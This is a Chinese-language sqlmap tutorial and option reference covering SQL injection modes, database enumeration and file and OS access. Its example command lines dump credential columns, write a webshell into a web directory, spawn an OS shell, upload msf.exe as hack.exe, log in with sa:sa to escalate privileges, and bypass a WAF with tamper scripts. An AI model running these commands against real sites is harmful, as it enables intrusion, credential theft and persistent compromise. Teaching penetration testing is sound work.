# sqlmap使用

## **sqlmap简介**

sqlmap支持五种不同的注入模式：

- 1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。

- 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。

- 3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。

- 4、联合查询注入，可以使用union的情况下的注入。

- 5、堆叠查询注入，可以同时执行多条语句的执行时的注入。

### **sqlmap支持的数据库有**

MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB

### **检测注入**

**基本格式**	

sqlmap -u "[*http://www.vuln.cn/post.php?id=1*](http://www.vuln.cn/post.php?id=1)"

默认使用level1检测全部数据库类型

sqlmap -u "[*http://www.vuln.cn/post.php?id=1*](http://www.vuln.cn/post.php?id=1)"  --dbms mysql --level 3

指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）

**跟随302跳转**

当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，

当注入错误的时候，先报错再跳转的时候，不需要跟随302。

目的就是：要追踪到错误信息。

**cookie注入**

当程序有防get注入的时候，可以使用cookie注入

sqlmap -u "[*http://www.baidu.com/shownews.asp*](http://www.baidu.com/shownews.asp)" --cookie "id=11" --level 2（只有level达到2才会检测cookie）

**从post数据包中注入**

-r 1.txt 对于用post方法提交的，参数不在URL里面的网页，可以先截获数据，保存成文件再用这个参数执行

可以使用burpsuite或者temperdata等工具来抓取post包

sqlmap -r "c:\tools\request.txt" -p "username" --dbms mysql    指定username参数

**注入成功后**

**获取数据库基本信息**

sqlmap -r XX.txt   --dbs

查询有哪些数据库

sqlmap -r XX.txt -D test --tables

查询test数据库中有哪些表

sqlmap -r XX.txt  -D test -T admin --columns

查询test数据库中admin表有哪些字段

sqlmap -r XX.txt   -D test -T admin -C "username,password" --dump

dump出字段username与password中的数据

其他命令参考下面

**从数据库中搜索字段**

sqlmap -r "c:\tools\request.txt" --dbms mysql -D dedecms --search -C admin,password

在dedecms数据库中搜索字段admin或者password。

**读取与写入文件**

首先找需要网站的物理路径，其次需要有可写或可读权限。

--file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）

--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）

--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径

\#示例：

sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\inc\include\1.php" --file-write "f:\webshell\1112.php"

使用shell命令：

sqlmap -r "c:\tools\request.txt" -p id --dms mysql --os-shell

接下来指定网站可写目录：

“E:\php\htdocs\dvwa”

\#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）

### **sqlmap详细命令：**

- --is-dba 当前用户权限（是否为root权限）

- --dbs 所有数据库

- --current-db 网站当前数据库

- --users 所有数据库用户

- --current-user 当前数据库用户

- --random-agent 构造随机user-agent

- --passwords 数据库密码

- --proxy [*http://local:8080*](http://local:8080) --threads 10 (可以自定义线程加速) 代理

- --time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）

——————————————————————————————————

### **Options（选项）：**

- --version 显示程序的版本号并退出

- -h, --help 显示此帮助消息并退出

- -v VERBOSE 详细程度级别：指注入时sqlmap的界面显示的内容的详细程度，级别程度为0-6，默认为1。

- 保存进度继续跑：

sqlmap -u “[*http://url/news?id=1*](http://url/news?id=1)“ –dbs-o “sqlmap.log” 保存进度

sqlmap -u “[*http://url/news?id=1*](http://url/news?id=1)“ –dbs-o “sqlmap.log” –resume 恢复已保存进度

### **Target（目标）：**

以下至少需要设置其中一个选项，设置目标URL。

- -d DIRECT 直接连接到数据库。

- -u URL, --url=URL 目标URL。

- -l LIST 从Burp或WebScarab代理的日志中解析目标。

- -r REQUESTFILE 从一个文件中载入HTTP请求。

- -g GOOGLEDORK 处理Google dork的结果作为目标URL。

- -c CONFIGFILE 从INI配置文件中加载选项。

### **Request（请求）：**

这些选项可以用来指定如何连接到目标URL。

- --data=DATA 通过POST发送的数据字符串

- --cookie=COOKIE HTTP Cookie头

- --cookie-urlencode URL 编码生成的cookie注入

- --drop-set-cookie 忽略响应的Set - Cookie头信息

- --user-agent=AGENT 指定 HTTP User - Agent头

- --random-agent 使用随机选定的HTTP User - Agent头

- --referer=REFERER 指定 HTTP Referer头

- --headers=HEADERS 换行分开，加入其他的HTTP头

- --auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)

- --auth-cred=ACRED HTTP身份验证凭据（用户名:密码）

- --auth-cert=ACERT HTTP认证证书（key_file，cert_file）

- --proxy=PROXY 使用HTTP代理连接到目标URL

- --proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）

- --ignore-proxy 忽略系统默认的HTTP代理

- --delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒

- --timeout=TIMEOUT 等待连接超时的时间（默认为30秒）

- --retries=RETRIES 连接超时后重新连接的时间（默认3）

- --scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式

- --safe-url=SAFURL 在测试过程中经常访问的url地址

- --safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL

### **Enumeration（枚举）：**

这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行

您自己的SQL语句。

- -b, --banner 检索数据库管理系统的标识

- --current-user 检索数据库管理系统当前用户

- --current-db 检索数据库管理系统当前数据库

- --is-dba 检测DBMS当前用户是否DBA

- --users 枚举数据库管理系统用户

- --passwords 枚举数据库管理系统用户密码哈希

- --privileges 枚举数据库管理系统用户的权限

- --roles 枚举数据库管理系统用户的角色

- --dbs 枚举数据库管理系统数据库

- -D DBname 要进行枚举的指定数据库名

- -T TBLname 要进行枚举的指定数据库表（如：-T tablename --columns）

- --tables 枚举的DBMS数据库中的表

- --columns 枚举DBMS数据库表列

- --dump 转储数据库管理系统的数据库中的表项

- --dump-all 转储所有的DBMS数据库表中的条目

- --search 搜索列（S），表（S）和/或数据库名称（S）

- -C COL 要进行枚举的数据库列

- -U USER 用来进行枚举的数据库用户

- --exclude-sysdbs 枚举表时排除系统数据库

- --start=LIMITSTART 第一个查询输出进入检索

- --stop=LIMITSTOP 最后查询的输出进入检索

- --first=FIRSTCHAR 第一个查询输出字的字符检索

- --last=LASTCHAR 最后查询的输出字字符检索

- --sql-query=QUERY 要执行的SQL语句

- --sql-shell 提示交互式SQL的shell

### **Optimization（优化）：**

这些选项可用于优化SqlMap的性能。

- -o 开启所有优化开关

- --predict-output 预测常见的查询输出

- --keep-alive 使用持久的HTTP（S）连接

- --null-connection 从没有实际的HTTP响应体中检索页面长度

- --threads=THREADS 最大的HTTP（S）请求并发量（默认为1）

### **Injection（注入）：**

这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。

- -p TESTPARAMETER 可测试的参数（S）

- --dbms=DBMS 强制后端的DBMS为此值

- --os=OS 强制后端的DBMS操作系统为这个值

- --prefix=PREFIX 注入payload字符串前缀

- --suffix=SUFFIX 注入payload字符串后缀

- --tamper=TAMPER 使用给定的脚本（S）篡改注入数据

### **Detection（检测）：**

这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。

- --level=LEVEL 执行测试的等级（1-5，默认为1）

- --risk=RISK 执行测试的风险（0-3，默认为1）

- --string=STRING 查询时有效时在页面匹配字符串

- --regexp=REGEXP 查询时有效时在页面匹配正则表达式

- --text-only 仅基于在文本内容比较网页

**三种级别：详细程度/探测/风险**

- **详细程度级别**：指注入时sqlmap的界面显示的内容的详细程度，级别程度为0-6，默认为1，指定参数用-v来表示。

### **sqlmap -u "url" -v 级别**

详细等级介绍：

0：只显示python错误以及严重的信息。

1：同时显示基本信息和警告信息。（默认）

2：同时显示debug信息。

3：同时显示注入的payload。

4：同时显示HTTP请求。

5：同时显示HTTP响应头。

6：同时显示HTTP响应页面。

- **探测等级**：指注入的payload语句的复杂程度，级别为1-5，默认为1。

### **sqlmap -u "url" --level=LEVEL**

1.使用哪些payload也影响注入点的选择。

2.GET/POST都会测试,level 2时，会测试cookie，level 3时，会测试User-Agent和Referer。

建议：确定使用那个payload和那个参数作为注入点时，为了保证全面性，建议使用高的level值。

- **风险等级：**指是否要使用具有不同级别风险的测试语句，级别为1-3，默认为1。

### **sqlmap -u "url" --risk=RISK**

默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的QL注入测试。在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。

### **Techniques（技巧）：**

这些选项可用于调整具体的SQL注入测试。

- --technique=TECH SQL注入技术测试（默认BEUST）

- --time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）

- --union-cols=UCOLS 定列范围用于测试UNION查询注入

- --union-char=UCHAR 用于暴力猜解列数的字符

**Fingerprint（指纹）：**

- ### -f, --fingerprint 执行检查广泛的DBMS版本指纹

### **Brute force（蛮力）：**

这些选项可以被用来运行蛮力检查。

- --common-tables 检查存在共同表

- --common-columns 检查存在共同列

User-defined function injection（用户自定义函数注入）：

这些选项可以用来创建用户自定义函数。

--udf-inject 注入用户自定义函数

--shared-lib=SHLIB 共享库的本地路径

### **File system access（访问文件系统）：**

这些选项可以被用来访问后端数据库管理系统的底层文件系统。

- --file-read=RFILE 从后端的数据库管理系统文件系统读取文件

- --file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件

- --file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径

### **Operating system access（操作系统访问）：**

这些选项可以用于访问后端数据库管理系统的底层操作系统。

- --os-cmd=OSCMD 执行操作系统命令

- --os-shell 交互式的操作系统的shell

- --os-pwn 获取一个OOB shell，meterpreter或VNC

- --os-smbrelay 一键获取一个OOB shell，meterpreter或VNC

- --os-bof 存储过程缓冲区溢出利用

- --priv-esc 数据库进程用户权限提升

- --msf-path=MSFPATH Metasploit Framework本地的安装路径

- --tmp-path=TMPPATH 远程临时文件目录的绝对路径

### **Windows注册表访问：**

这些选项可以被用来访问后端数据库管理系统Windows注册表。

- --reg-read 读一个Windows注册表项值

- --reg-add 写一个Windows注册表项值数据

- --reg-del 删除Windows注册表键值

- --reg-key=REGKEY Windows注册表键

- --reg-value=REGVAL Windows注册表项值

- --reg-data=REGDATA Windows注册表键值数据

- --reg-type=REGTYPE Windows注册表项值类型

这些选项可以用来设置一些一般的工作参数。

- -t TRAFFICFILE 记录所有HTTP流量到一个文本文件中

- -s SESSIONFILE 保存和恢复检索会话文件的所有数据

- --flush-session 刷新当前目标的会话文件

- --fresh-queries 忽略在会话文件中存储的查询结果

- --eta 显示每个输出的预计到达时间

- --update 更新SqlMap

- --save file保存选项到INI配置文件

- --batch 从不询问用户输入，使用所有默认配置。

**Miscellaneous（杂项）：**

- ### --beep 发现SQL注入时提醒

- --check-payload IDS对注入payloads的检测测试

- --cleanup SqlMap具体的UDF和表清理DBMS

- --forms 对目标URL的解析和测试形式

- --gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果

- --page-rank Google dork结果显示网页排名（PR）

- --parse-errors 从响应页面解析数据库管理系统的错误消息

- --replicate 复制转储的数据到一个sqlite3数据库

- --tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址

- --wizard 给初级用户的简单向导界面

 

--proxy="127.0.0.1:8080" 指定使用代理

-r:指定文本文件 sqlmap -r 1.txt

--risk=RISK 执行测试的风险（0-3，默认为1）

--dbs:列出所有数据库 -D指定数据库

--time-sec 3 设置延时注入时间

--tables:列出数据库所有表 -T指定表

--columns:列出表中所有字段 -C指定字段

--dump:获取字段内容

--users:获取数据库中所有用户

--password:获取数据库用户密码

--current-db:指定当前网站数据库

--current-user:获取当前网站数据库用户

--level 1-5: 选择注入等级，默认1

--is-dba:判断当前用户是否为管理员账户

--os-shell 交互式的操作系统的shell

--roles:列出数据库管理员角色

--referer:伪造referer头

--sql-shell:运行自义定sql语句

--os-cmd:运行任意操作系统命令(需要权限)

--file-read:读取数据库服务器中文件

-p:指定参数

--file-write --file-dest:上传文件到服务器 例如--file-write msf.exe --file-dest "C:\phpStudy\PHPTutorial\MySQL\data\hack.exe"

--random-agent 去除sqlmap指纹

--batch 自动答复与判断

--risk 3 设置是否允许注入垃圾字符如添加数据删除数据

-v 3 可以查看到sqlmap所执行的payload

 

 

sqlmap.py -d mssql://sa:sa@10.168.188.15:1433/master --os-shell 执行数据库提权操作

sqlmap.py -r c:/2.txt --dbms mssql --skip-waf --random-agent --technique SBT -v 3 -p newpass --tamper equaltolike,space2mysqldash 绕过安全狗

 
